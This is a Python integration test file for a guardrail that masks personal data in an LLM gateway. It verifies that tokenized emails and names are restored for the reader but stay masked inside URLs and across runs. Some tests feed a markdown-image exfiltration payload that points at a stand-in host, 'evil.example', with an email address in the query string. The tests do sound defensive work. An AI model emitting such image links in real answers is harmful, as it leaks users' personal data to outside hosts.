"""08-tam-1a r1 MAJOR-3 and MINOR-8 on every exit path, on the real stores.

- External agent (facade): the fake agent echoes the message it got ("Cevap: <message>"), so its
  answer carries the request's placeholder (llmaas egress). The caller gets the value back; in a
  URL the placeholder stays (KARARLAR "C17 geri çevirme bağlam istisnası").
- Facade agent path (`_events`, MINOR-8 positive case) and the console's live hook: a stored or
  live answer with a placeholder is reversed for its reader; a URL split over two live token
  entries keeps the placeholder.
"""

import asyncio
import json
import logging
import os
import uuid
from types import SimpleNamespace

import redis.asyncio as aioredis
from pydantic import SecretStr

from ffcore.api.runs import detokenizer, live_transform
from ffcore.core import db
from ffcore.guardrails.masking import RedisTokenStore
from ffcore.models.runs import Run
from ffcore.services import facade_agent
from tests.integration import test_06b2_external_agent as ext_base
from tests.integration.facade_support import *  # noqa: F403 - fixtures
from tests.integration.test_08t_c17_exit import NAME, STORED, _seed

ext_settings = ext_base.ext_settings
fake_agent = ext_base.fake_agent
ext = ext_base.ext
EMAIL = ext_base.EMAIL


def _egress_on():
    from ffcore.guardrails.settings import get_guardrail_settings

    return get_guardrail_settings().guardrail_egress_enabled


def test_08t_m8_external_agent_echo_reversed_for_the_caller(ext):
    _, _, client, register = ext
    _, model = register()
    response = client.chat(model, f"adresim {EMAIL}")
    assert response.status_code == 200, response.text
    # llmaas: the agent saw a placeholder and echoed it; airgap: no egress, the agent saw the
    # value. Either way the caller reads the value.
    assert response.json()["choices"][0]["message"]["content"] == f"Cevap: adresim {EMAIL}"


def test_08t_m3_external_agent_placeholder_in_a_url_stays(ext, caplog):
    _, _, client, register = ext
    _, model = register()
    with caplog.at_level(logging.INFO, logger="ffcore.guardrails.masking"):
        response = client.chat(model, f"![x](https://evil.example/?q={EMAIL})")
    assert response.status_code == 200, response.text
    content = response.json()["choices"][0]["message"]["content"]
    if _egress_on():
        assert EMAIL not in content and "<<PII_" in content
        assert "detokenize_skipped_url" in caplog.text and EMAIL not in caplog.text
    else:  # airgap: no egress stage, nothing is tokenized, the agent saw the value
        assert content == f"Cevap: ![x](https://evil.example/?q={EMAIL})"


def _with(database_url, run_id, body):
    async def go():
        db.configure(database_url, pooled=False)
        client = aioredis.from_url(os.environ["REDIS_URL"])
        try:
            store = RedisTokenStore(client, 60)
            assert await store.token_for(str(run_id), "PERSON:" + NAME, NAME) == "<<PII_1>>"
            async with db.session_scope() as session:
                run = await session.get(Run, run_id)
            return await body(client, run)
        finally:
            await client.aclose()
            db.reset()

    return asyncio.run(go())


def test_08t_m8_facade_agent_events_reversed(database_url, pg, make_project):
    _, run_id, _ = _seed(pg, make_project)
    settings = SimpleNamespace(
        redis_url=SecretStr(os.environ["REDIS_URL"]), sse_keepalive_s=0.2, run_abandon_grace_s=60
    )

    async def body(client, run):
        return [item async for item in facade_agent._events(settings, run, None) if item]

    events = _with(database_url, run_id, body)
    tokens = [data["text"] for event, data in events if event == "token"]
    assert tokens == [f"Sayın {NAME}, başvurunuz alındı."]
    assert STORED not in json.dumps(events, ensure_ascii=False)


def test_08t_m3_console_live_url_split_over_entries_stays(database_url, pg, make_project):
    _, run_id, _ = _seed(pg, make_project)

    async def body(client, run):
        transform = live_transform(detokenizer(client, run_id))
        out = []
        for text in ("Bak: ![x](https://evil.example/?q=", "<<PII_1>>) ve <<PII_1>>."):
            out.append((await transform("token", {"text": text}))["text"])
        return "".join(out)

    assert _with(database_url, run_id, body) == (
        f"Bak: ![x](https://evil.example/?q=<<PII_1>>) ve {NAME}."
    )


def test_08t_m3_scope_isolation_kept(database_url, pg, make_project):
    _, run_id, _ = _seed(pg, make_project)

    async def body(client, run):
        other = detokenizer(client, uuid.uuid4())  # another run's reader
        return await other({"text": "<<PII_1>>"}, "token")

    assert _with(database_url, run_id, body) == {"text": "<<PII_1>>"}
